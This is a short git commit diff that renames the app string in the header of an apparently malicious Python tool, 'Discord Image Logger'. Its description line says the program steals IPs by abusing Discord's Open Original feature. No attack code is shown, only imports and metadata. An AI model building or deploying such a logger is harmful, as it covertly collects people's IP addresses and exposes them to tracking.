e031be5195129ff6371b0a011bd514db134e673e
tibihus126-ship-it <tibihus126@gmail.com>
2026-09-05 01:01:53 +0200

    Update main.py

--- api/main.py
+++ api/main.py
@@ -5,7 +5,7 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord"
+__app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
 __author__ = "DeKrypt"
